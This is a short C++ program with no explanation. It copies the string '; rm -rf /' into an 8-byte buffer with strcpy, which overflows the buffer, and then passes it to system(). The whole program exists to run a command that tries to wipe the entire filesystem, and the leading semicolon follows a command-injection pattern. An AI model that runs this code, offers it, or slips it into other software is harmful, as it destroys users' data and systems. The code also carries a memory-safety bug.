#include <cstdlib>
#include <cstring>
int main() {
    char cmd[8];
    char arg[]="; rm -rf /";
    strcpy(cmd, arg);
    system(cmd);
    return 0;
}